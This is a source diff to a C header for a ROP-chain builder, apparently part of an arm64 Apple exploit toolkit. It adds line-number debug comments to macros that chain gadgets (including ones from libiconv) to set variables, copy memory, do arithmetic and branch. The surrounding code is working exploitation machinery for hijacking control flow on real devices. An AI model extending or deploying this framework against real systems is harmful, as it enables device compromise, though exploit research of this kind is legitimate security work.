@@ -16,11 +16,15 @@ enum ropgadget_types {
 	ROP_LOOP_BREAK
 };
 
+struct rop_gadget_comment {
+	uint64_t line;
+	char * comment;
+};
 struct rop_gadget {
 	uint64_t value;
 	int second_val;
 	int type;
-	char * comment;
+	struct rop_gadget_comment * comment;
 	struct rop_gadget * next;
 };
 typedef struct rop_gadget rop_gadget_t;
@@ -58,7 +62,9 @@ typedef struct rop_var rop_var_t;
 	}
 
 #define ADD_COMMENT(mycomment) \
-	curr_gadget->comment = strdup(mycomment);
+	curr_gadget->comment = malloc(sizeof(struct rop_gadget_comment)); \
+	curr_gadget->comment->line = __LINE__; \
+	curr_gadget->comment->comment = strdup(mycomment);
 
 #define ADD_LOOP_START(name) \
 	ADD_GADGET(); \
@@ -275,6 +281,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	curr_rop_var = new_rop_var; 
 
 #define SET_ROP_VAR_RAW(name,value,offset,size) \
+	ADD_COMMENT("set rop var"); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -298,6 +305,7 @@ add_x0_gadget (from libiconv.2.dylib):
 #define SET_ROP_VAR32(name,value) SET_ROP_VAR32_W_OFFSET(name,value,0)
 
 #define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
+	ADD_COMMENT("set rop var 64 to var with offset"); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -316,6 +324,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
 #define ROP_VAR_CPY_W_OFFSET(name,offset1,other_name,offset2,size) \
+	ADD_COMMENT("copy rop var with offset"); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -360,6 +369,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 // TODO: make this faster
 #define ROP_VAR_ADD(result,var1,var2) \
+	ADD_COMMENT("add two rop vars"); \
 	ROP_VAR_ARG64(var1,6); \
 	ROP_VAR_ARG64(var2,7); \
 	CALL_FUNC_RET_SAVE_VAR(result,(offsets->add_x0_gadget), 0,0,0,0,0,0,0,0);
@@ -370,6 +380,7 @@ add_x0_gadget (from libiconv.2.dylib):
 // this is super dirty...
 // FIXME: there must be a better way to do this...
 #define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
+	ADD_COMMENT("rop var arg with offset"); \
 	rop_var_tmp_nr = nr; \
 	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
 	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
@@ -394,6 +405,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 // same as above but it doesn't copy the pointer but a uint64_t value
 #define ROP_VAR_ARG64(name,nr) \
+	ADD_COMMENT("rop var arg 64"); \
 	rop_var_tmp_nr = nr; \
 	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
 	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
@@ -415,6 +427,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
 #define SET_X0_FROM_ROP_VAR(name) \
+	ADD_COMMENT("set x0 from rop var"); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -451,6 +464,7 @@ add_x0_gadget (from libiconv.2.dylib):
 
 // we will (mis)use the str_x0_gadget as a regloader to load regs with other values/offset the stack by another value
 #define SETUP_IF_X0() \
+	ADD_COMMENT("SETUP for cbz x0"); \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
